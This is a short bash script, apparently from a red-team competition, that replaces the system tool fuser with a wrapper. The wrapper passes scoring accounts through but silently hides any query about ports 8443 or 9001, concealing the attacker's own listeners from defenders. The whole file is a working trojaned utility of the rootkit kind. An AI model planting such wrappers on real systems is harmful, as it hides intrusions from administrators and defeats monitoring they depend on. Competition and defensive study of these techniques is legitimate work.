#!/bin/bash
REAL_FUSER="/bin/fuser"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_FUSER "$@" ;;
esac

# If they're explicitly asking about our ports, return nothing
for arg in "$@"; do
    case "$arg" in
        *8443*|*9001*) exit 1 ;;
    esac
done

exec $REAL_FUSER "$@"
